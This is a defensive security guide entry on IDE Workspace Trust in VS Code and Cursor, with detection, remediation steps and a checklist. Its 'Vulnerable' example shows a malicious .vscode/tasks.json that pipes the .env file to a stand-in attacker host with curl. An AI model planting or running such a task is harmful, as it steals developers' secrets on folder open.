# 46. IDE Workspace Trust Execution

## 🟡 Risk Level: **MEDIUM**

## 📋 Vulnerability Description

Vibe coding workflows often involve downloading entire repositories or templates. If "Workspace Trust" is disabled in tools like Cursor or VS Code, opening a malicious repository can automatically execute commands via .vscode/tasks.json. This allows attackers to steal local .env secrets or install malware immediately upon opening the folder.

**Impact:**
- Local secret theft
- Malware installation
- Unauthorized code execution
- Development environment compromise

## 🎯 Context: Why This Happens

Developers:
- Disable workspace trust for convenience
- Open untrusted repositories
- Don't review .vscode files
- Trust downloaded code

## 🔍 Detection Methods

### 1. IDE Settings

**Check:**
- Workspace Trust enabled?
- .vscode/tasks.json reviewed?
- Startup scripts checked?

### 2. Repository Review

**Before opening:**
- Review .vscode directory
- Check tasks.json
- Review package.json scripts

## ✅ Verification Requirements

### Must Have:
1. **Workspace Trust Enabled**
   - Enable in IDE settings
   - Review before trusting
   - Don't auto-trust

2. **Code Review**
   - Review .vscode files
   - Check startup scripts
   - Verify package.json

## 🚨 Exploit Path

### Scenario 1: Malicious Tasks
```
1. Developer downloads repository
2. Opens in VS Code
3. Workspace trust disabled
4. .vscode/tasks.json executes
5. Scripts steal .env file
6. Secrets compromised
```

## 🔧 Remediation Steps

### Step 1: Enable Workspace Trust

**VS Code:**
1. Settings → Security → Workspace Trust
2. Enable "Workspace Trust"
3. Always review before trusting

**Cursor:**
- Similar settings
- Enable workspace trust
- Review prompts

### Step 2: Review Before Opening

```bash
# Review .vscode directory
ls -la .vscode/

# Check tasks.json
cat .vscode/tasks.json

# Check package.json scripts
cat package.json | grep scripts
```

### Step 3: Use Environment Variable Managers

```bash
# Use dedicated tool instead of .env
# e.g., direnv, asdf, etc.
```

## 📝 Code Examples

### ❌ Vulnerable

```json
// .vscode/tasks.json - Malicious
{
  "version": "2.0.0",
  "tasks": [{
    "label": "Setup",
    "type": "shell",
    "command": "cat .env | curl -X POST https://attacker.com/steal -d @-"
  }]
}
```

### ✅ Secure

```json
// .vscode/tasks.json - Safe
{
  "version": "2.0.0",
  "tasks": [{
    "label": "Build",
    "type": "shell",
    "command": "npm run build"
  }]
}
```

## 🧪 Testing Checklist

- [ ] Workspace Trust enabled
- [ ] .vscode files reviewed
- [ ] Tasks.json checked
- [ ] Package.json scripts verified
- [ ] Environment variables secure
- [ ] No auto-execution

## 📚 References

- [VS Code Workspace Trust](https://code.visualstudio.com/docs/editor/workspace-trust)
- [OWASP: Development Environment Security](https://cheatsheetseries.owasp.org/cheatsheets/Development_Environment_Cheat_Sheet.html)

## 🔗 Related Vulnerabilities

- [03. Exposed API Keys in Repos](../data_protection/03_exposed_api_keys.md)
- [14. Leaked Secrets in Git History](../data_protection/14_leaked_secrets_git.md)

---

**Classification**:
- **Confirmed** if workspace trust disabled
- **Likely** if .vscode files not reviewed
- **Not Applicable** if workspace trust enabled and files reviewed
